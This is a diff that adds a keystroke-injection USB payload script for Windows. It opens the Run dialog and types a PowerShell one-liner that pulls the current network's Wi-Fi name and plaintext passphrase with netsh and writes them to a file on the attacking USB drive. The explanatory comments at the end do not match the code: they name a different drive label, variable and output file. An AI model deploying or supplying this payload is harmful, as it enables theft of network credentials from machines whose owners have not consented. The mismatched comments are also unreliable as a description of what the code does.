@@ -1,0 +1,13 @@
+REM Example Simple USB Exfiltration Technique for Windows
+ATTACKMODE HID STORAGE
+DELAY 2000
+GUI r
+DELAY 100
+STRING powershell -nop -c "$d=(gwmi win32_volume|?{$_.Label-eq'CIRCUITPY'}).DriveLetter+'\sd';md $d -f;$s=(Get-NetConnectionProfile).Name;$p=netsh wlan show profile $s key=clear|?{$_-match'Cont'}|%{$_-split':',2|select -Last 1};\"$s`r`n$p\" >> $d\1.txt"
+ENTER
+
+
+REM This short Powershell one-liner executes from the Windows Run dialog.
+REM The drive letter of the volume with the label “DUCKY” is saved as $m.
+REM The netsh command will get the network name and passphrase for the currently connected network ((Get-NetConnectionProfile).Name).
+REM The results of the netsh command (filtered for only SSID and key) will be redirected (saved) to a file on the root of the “DUCKY” drive, saved as the computer name (in .txt format).
